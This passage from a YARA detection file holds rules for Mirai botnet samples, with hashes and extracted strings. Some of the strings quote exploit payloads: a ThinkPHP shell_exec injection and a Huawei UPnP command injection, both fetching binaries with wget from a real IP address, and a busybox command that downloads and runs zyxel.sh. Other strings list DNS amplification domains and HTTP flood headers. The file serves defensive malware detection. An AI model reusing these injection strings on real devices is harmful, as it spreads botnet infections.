      $s6 = "/usr/sbin/wget" fullword ascii /* score: '12.00'*/
      $s7 = "/usr/sbin/ftpget" fullword ascii /* score: '12.00'*/
      $s8 = "/usr/sbin/tftp" fullword ascii /* score: '12.00'*/
      $s9 = "/usr/bin/ftpget" fullword ascii /* score: '9.00'*/
      $s10 = "/usr/bin/wget" fullword ascii /* score: '9.00'*/
      $s11 = "/usr/bin/tftp" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 600KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__c60b7d3b_Mirai_signature__d184f7f9_Mirai_signature__dbc8ddcd_26 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_c60b7d3b.elf, Mirai(signature)_d184f7f9.elf, Mirai(signature)_dbc8ddcd.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "c60b7d3bf957430e997d3911402ae9a3fbc739cce0f2f98587f758313721dfb5"
      hash2 = "d184f7f938ea2892c757c1d428f086bbeec42ab6d121bea60cb679e8cc840712"
      hash3 = "dbc8ddcd163742dd5e54ea64a663d59963eb9662a4de33a1763a9ad051b735c0"
   strings:
      $x1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlso" ascii /* score: '44.00'*/
      $x2 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '40.00'*/
      $x3 = "pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]='wget http://212.16.87.33/bins/x86 -O thonkphp ; ch" ascii /* score: '37.00'*/
      $s4 = " -g 89.144.20.51 -l /tmp/binary -r /mips; /bin/busybox chmod 777 * /tmp/binary; /tmp/binary mips)</NewStatusURL><NewDownloadURL>" ascii /* score: '30.00'*/
      $s5 = " /bin/busybox wget http://212.16.87.33/zyxel.sh; chmod +x zyxel.sh; ./zyxel.sh" fullword ascii /* score: '27.00'*/
      $s6 = "POST /cgi-bin/ViewLog.asp HTTP/1.1" fullword ascii /* score: '27.00'*/
      $s7 = "User-Agent: python-requests/2.20.0" fullword ascii /* score: '17.00'*/
      $s8 = "User-Agent: Uirusu/2.0" fullword ascii /* score: '17.00'*/
      $s9 = "GET /index.php?s=/index/" fullword ascii /* score: '16.00'*/
      $s10 = "Host: 192.168.0.14:80" fullword ascii /* score: '14.00'*/
      $s11 = "mod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp' HTTP/1.1" fullword ascii /* score: '11.00'*/
      $s12 = "$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>" fullword ascii /* score: '10.00'*/
      $s13 = "Content-Length: 227" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b7ceaa35_Mirai_signature__d21c89ef_Mirai_signature__d281fd0d_Mirai_signature__dd_27 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d281fd0d.elf, Mirai(signature)_ddd31ce2.elf, Mirai(signature)_f185493b.elf, Mirai(signature)_f3291553.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash3 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash4 = "d281fd0d07905b6d53a5d22e89a703f7ec878973e08a7824418d7784896aff3b"
      hash5 = "ddd31ce2eb639acaceadf5a821829fd9cb0cd0825ade45d7919978efbc5a02c9"
      hash6 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
      hash7 = "f329155356c4eddcdbf1af2e9c2b9cb7165b4a822404c91ab8606576b3022699"
   strings:
      $s1 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '24.00'*/
      $s2 = "omany.ultradns-geo.organy.edgecastcdn.netlarge.spf.trusteddomain.orgdkim20._domainkey.godaddy.comtxt.awsdns-hostedzone-info.coma" ascii /* score: '21.00'*/
      $s3 = "live.com" fullword ascii /* score: '21.00'*/
      $s4 = "tiktok.com" fullword ascii /* score: '21.00'*/
      $s5 = "ns.bizdnssec.ripe.netdnssec-failed.orgroot-dnssec.netlarge-dns.akamai.comdns-bigresponse.cloudns.netlarge.txt.research.umbrella." ascii /* score: '20.00'*/
      $s6 = "dnssec-root.iana.orgk.root-servers.netdnssec-failover.cloudflare.comany.dns.oracle.comany.dns.akamai-edge.netany.microsoft-dns.c" ascii /* score: '20.00'*/
      $s7 = ".dehost-dane-self.weberdns.dehost-dnssec.weberdns.deany.isc.organy.cdn77.comany.awsdns-00.organy.cloudflare-dnssec.netany.ultrad" ascii /* score: '19.00'*/
      $s8 = "dns-bigresponse.cloudns.netlarge.txt.research.umbrella.com" fullword ascii /* score: '18.00'*/
      $s9 = "combigtxt.dns-oarc.netipv6.ripe.netaaaa.nasa.govipv6.google.comipv6.research.ix.ruipv6.6bone.netroot-servers.netdnssec.icann.org" ascii /* score: '16.00'*/
      $s10 = "nasa.gov" fullword ascii /* score: '10.00'*/
      $s11 = "all._spf.mimecast.comaaaa.weberdns.dea.weberdns.decname.weberdns.detxt.weberdns.de_sip._tcp.weberdns.deip-documentation.weberdns" ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 500KB and ( 8 of them )
      ) or ( all of them )
}

rule _Mirai_signature__b33b31f1_Mirai_signature__b4201416_Mirai_signature__b7ceaa35_Mirai_signature__bcce3295_Mirai_signature__c7_28 {
   meta:
      description = "_subset_batch - from files Mirai(signature)_b33b31f1.elf, Mirai(signature)_b4201416.elf, Mirai(signature)_b7ceaa35.elf, Mirai(signature)_bcce3295.elf, Mirai(signature)_c74ebc06.elf, Mirai(signature)_cd272f9a.elf, Mirai(signature)_d0011fed.elf, Mirai(signature)_d102ff43.elf, Mirai(signature)_d21c89ef.elf, Mirai(signature)_d3fc0855.elf, Mirai(signature)_d4519c78.elf, Mirai(signature)_d4f0fe27.elf, Mirai(signature)_d539d2ed.elf, Mirai(signature)_e04a2d04.elf, Mirai(signature)_e1802e85.elf, Mirai(signature)_eb144746.elf, Mirai(signature)_edb07abc.elf, Mirai(signature)_efc129dc.elf, Mirai(signature)_f04b1c89.elf, Mirai(signature)_f185493b.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-28"
      hash1 = "b33b31f1b97e56a4718e745caddc5fe11c57394d1bb8ad72e8df4fa70af64007"
      hash2 = "b420141649d6504e0d5a231f746f01a3f610747dba7b17e47e1d8bb112479e48"
      hash3 = "b7ceaa35c66f9aaf6b6ae46cda52f2c249235012ddf24dea4e49746008496c66"
      hash4 = "bcce329532aefb43914eff68d30c66d1f6ee1b5703726f12ee97d222c70c808a"
      hash5 = "c74ebc0618950bd3146d9c0033ee6112116fa644859181a9de944104f429c1e6"
      hash6 = "cd272f9af7cd4cbce9dbdc46ac6d93d24b6fb0a9e91c6716f47a8b6fd3ca7090"
      hash7 = "d0011fed2ec415580dfae3f89e8d5bf176b685eebae97975041a9bbba4cd1c9e"
      hash8 = "d102ff43d43bffb64cfe9fdf7c775ebaa78c2b79c5c72f50f73c9fb098aa133e"
      hash9 = "d21c89ef8692e1182e815daa5363aaa284d5783e5570485d8734cd437035df34"
      hash10 = "d3fc08559d1e4bfa4f9f342c0a0f5686e8a3c79f67180320028a93c743aae42a"
      hash11 = "d4519c78702b5ff8fa900da590d8d91646a3e0de5eafd7f3f62068f6c165202d"
      hash12 = "d4f0fe27cbf49dfd1fba10f68b8855dd0c038383689c9c3771a9d6b7faff9e4e"
      hash13 = "d539d2ed50381a6ea9b0ba03a32d9ac801413b75f72375738d6a2c709f94fe5c"
      hash14 = "e04a2d04e7e72a19917d180042f9c21dfb3b6a86ca1ad35819a23b237d64ca61"
      hash15 = "e1802e855658f7f679b9b52cb51de9c0ec3494810b2c59a6bc0ee6dc59e85b60"
      hash16 = "eb1447467171aaf9ecafa97dde7c471b034c08f7f620630458f1f61a1784b679"
      hash17 = "edb07abc54517a9f8ae8e33dc7170dc99178e9fd39ba5b6547a14b52cbc63ff9"
      hash18 = "efc129dce9c2f036da7cbc5ac154bfcc2dcf6311c2d3ce89345fc0c065d5ff5b"
      hash19 = "f04b1c89060f80a8f381421dcbd0a82f98107baef4333ba4ed1d0f8da707bfee"
      hash20 = "f185493b01d47584ac4dec0d4914f577f31eb6f08b70cf505fee1498853372a8"
   strings:
      $s1 = "Origin: https://www.facebook.com" fullword ascii /* score: '21.00'*/
      $s2 = "Origin: https://www.amazon.com" fullword ascii /* score: '21.00'*/
      $s3 = "Origin: https://www.linkedin.com" fullword ascii /* score: '21.00'*/
      $s4 = "Origin: https://www.google.com" fullword ascii /* score: '21.00'*/
      $s5 = "Origin: https://www.twitter.com" fullword ascii /* score: '21.00'*/
      $s6 = "Referer: https://www.amazon.com/" fullword ascii /* score: '17.00'*/
      $s7 = "Referer: https://www.linkedin.com/" fullword ascii /* score: '17.00'*/
      $s8 = "Referer: https://www.twitter.com/" fullword ascii /* score: '17.00'*/
      $s9 = "Referer: https://www.facebook.com/" fullword ascii /* score: '17.00'*/
      $s10 = "X-Forwarded-Host: %s" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 700KB and ( all of them )
      ) or ( all of them )
}

